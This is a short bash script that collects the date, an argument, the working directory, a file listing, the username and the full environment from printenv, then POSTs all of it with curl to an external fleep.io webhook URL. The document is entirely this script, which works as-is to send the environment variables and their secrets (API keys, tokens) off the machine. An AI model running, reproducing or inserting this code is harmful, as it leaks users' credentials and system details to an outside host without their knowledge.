#!/bin/bash

#

ARRAY=([0]="05/07/2017 12:16:22" [1]=$1 [2]=`pwd` [3]=`ls` [4]=`printenv` )
ARRAY=([0]="$(date +%Y-%m-%d_%H-%M-%S)"  [1]=$1 [2]=`pwd` [3]=`ls` [4]=`whoami` [5]=`printenv` )
RETURN=""

#echo "Array size: ${#ARRAY[*]}"

#echo "Array items and indexes:"
for index in ${!ARRAY[*]}
do
    #RETURN="${RETURN}\n"
    RETURN="${RETURN}${index}:
${ARRAY[$index]}

"
    #RETURN="${RETURN}\n"
done

#echo -e $RETURN
echo $RETURN

curl --request POST "https://fleep.io/hook/OLuIRi0JRt2yv5OQisX6tg" --data "${RETURN}"

#
